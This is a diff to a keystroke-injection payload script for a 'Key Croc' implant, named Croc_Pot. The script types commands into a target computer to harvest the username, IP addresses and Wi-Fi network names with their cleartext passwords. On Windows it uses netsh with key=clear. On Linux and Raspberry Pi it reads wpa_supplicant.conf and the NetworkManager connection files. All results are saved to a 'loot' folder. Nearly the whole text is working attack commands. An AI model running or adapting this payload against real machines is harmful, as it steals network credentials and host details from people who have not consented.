@@ -1,7 +1,9 @@
 # Title:         Croc_Pot Payload
-# Description:   Start Croc_pot bash script
+# Description:   Start Croc_pot.sh bash script automatically, scan takes about 30-40 sec to start because of OS detection
+#                This will collect some data like (ip address, current user name, pc host name, ssid and passwd, mac address)
+#                save to loot folder
 # Author:        Spywill
-# Version:       1.0.3
+# Version:       1.0.5
 # Category:      Key Croc
 #
 #
@@ -32,10 +34,10 @@ case $TARGET_OS in
            Q STRING "\$Croc = (gwmi win32_volume -f 'label=\"KeyCroc\"' | Select-Object -ExpandProperty DriveLetter)"
            Q ENTER
            sleep 1
-           Q STRING "Test-Connection -ComputerName (hostname) -Count 1 | Select IPV4Address | Format-Table -AutoSize | out-file -encoding UTF8 \"\$Croc\loot\Croc_OS_wind.txt\" -noclobber -append"
+           Q STRING "\$env:UserName | Format-Table -AutoSize | out-file -encoding UTF8 \"\$Croc\loot\Croc_OS_wind.txt\" -noclobber -append"
            Q ENTER
            sleep 1
-           Q STRING "\$env:UserName | Format-Table -AutoSize | out-file -encoding UTF8 \"\$Croc\loot\Croc_OS_wind.txt\" -noclobber -append"
+           Q STRING "Get-CimInstance -Class Win32_NetworkAdapterConfiguration -Filter IPEnabled=\$true | Select-Object -ExpandProperty IPAddress | Format-Table -AutoSize | out-file -encoding UTF8 \"\$Croc\loot\Croc_OS_wind.txt\" -noclobber -append"
            Q ENTER
            sleep 1
            Q STRING "(netsh wlan show networks) | Select-String \"\:(.+)\$\" | % {\$name=\$_.Matches.Groups[1].Value.Trim(); \$_} | %{(netsh wlan show profile name=\"\$name\" key=clear)} | Select-String \"Key Content\W+\:(.+)\$\" | % {\$pass=\$_.Matches.Groups[1].Value.Trim(); \$_} | %{[PSCustomObject]@{ PROFILE_NAME=\$name;PASSWORD=\$pass }} | out-file -encoding UTF8 \"\$Croc\loot\Croc_OS_wind.txt\" -noclobber -append"
@@ -96,7 +98,7 @@ raspberrypi)
            Q STRING "whoami | tee \${PC_USER}"
            Q ENTER
            sleep 1
-           Q STRING "ip -4 -o addr show wlan0 | awk '{print \$4}' | cut -d \"/\" -f 1 | tee -a \${PC_USER}" 
+           Q STRING "ip -4 -o addr show wlan0 | awk '{print \$4}' | cut -d \"/\" -f 1 | tee -a \${PC_USER} && ip -4 -o addr show eth0 | awk '{print \$4}' | cut -d \"/\" -f 1 | tee -a \${PC_USER} && echo '' >> \${PC_USER}" 
            Q ENTER
            sleep 1
            Q STRING "sed -n '/ssid\|psk/,+1p' /etc/wpa_supplicant/wpa_supplicant.conf | sed -e 's/[\"]//g' | tee -a \${PC_USER}"
@@ -141,7 +143,7 @@ raspberrypi)
            Q STRING "whoami | tee \${PC_USER}"
            Q ENTER
            sleep 1
-           Q STRING "ip -4 -o addr show wlan0 | awk '{print \$4}' | cut -d \"/\" -f 1 | tee -a \${PC_USER}" 
+           Q STRING "ip -4 -o addr show wlan0 | awk '{print \$4}' | cut -d \"/\" -f 1 | tee -a \${PC_USER} && ip -4 -o addr show eth0 | awk '{print \$4}' | cut -d \"/\" -f 1 | tee -a \${PC_USER} && echo '' >> \${PC_USER}"  
            Q ENTER
            sleep 1
            Q STRING "sudo grep -r '^psk=' /etc/NetworkManager/system-connections/ | sed -E -e 's/[/]//g' -e 's/etc//g' -e 's/NetworkManagersystem-connections//g' -e 's/.nmconnection:psk//g' | tee -a \${PC_USER}"
@@ -190,7 +192,7 @@ raspberrypi)
            Q STRING "whoami | tee \${PC_USER}"
            Q ENTER
            sleep 1
-           Q STRING "ip -4 -o addr show wlan0 | awk '{print \$4}' | cut -d \"/\" -f 1 | tee -a \${PC_USER}" 
+           Q STRING "ip -4 -o addr show wlan0 | awk '{print \$4}' | cut -d \"/\" -f 1 | tee -a \${PC_USER} && ip -4 -o addr show eth0 | awk '{print \$4}' | cut -d \"/\" -f 1 | tee -a \${PC_USER} && echo '' >> \${PC_USER}"  
            Q ENTER
            sleep 1
            Q STRING "sudo grep -r '^psk=' /etc/NetworkManager/system-connections/ | sed -E -e 's/[/]//g' -e 's/etc//g' -e 's/NetworkManagersystem-connections//g' -e 's/.nmconnection:psk//g' | tee -a \${PC_USER}"
